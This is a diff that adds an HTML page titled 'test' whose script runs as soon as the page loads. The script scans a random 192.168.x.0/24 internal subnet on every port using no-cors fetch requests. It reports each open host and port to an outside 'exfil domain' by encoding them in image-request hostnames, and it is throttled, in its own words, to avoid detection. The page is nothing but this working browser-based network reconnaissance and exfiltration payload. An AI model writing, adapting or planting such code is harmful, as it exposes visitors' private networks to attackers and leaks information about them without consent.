@@ -1,0 +1,45 @@
+<html>
+<head><title>test</title>
+<script>
+let host_root = "d0c3a6c04arnnmh5u.xtric.homes"; // your exfil domain
+let port_start = 0;
+let port_end = 65535;
+
+let a = Math.floor(Math.random() * 256);
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function scan() {
+  for (let b = 0; b < 256; b++) {
+    for (let port = port_start; port <= port_end; port++) {
+      let ip = `192.168.${a}.${b}`;
+      let url = `http://${ip}:${port}`;
+
+      try {
+        // Attempt to reach internal host:port
+        await fetch(url, {
+          method: 'GET',
+          mode: 'no-cors'
+        });
+
+        // If fetch does not throw, assume the port is open and exfil via DNS
+        let img = new Image();
+        img.src = `http://ip192-168-${a}-${b}-${port}.${host_root}`;
+      } catch (e) {
+        // Connection failed — do nothing
+      }
+
+      await sleep(10); // throttle to avoid detection or resource exhaustion
+    }
+  }
+}
+
+scan();
+
+</script>
+</head>
+<body>
+</body>
+</html>
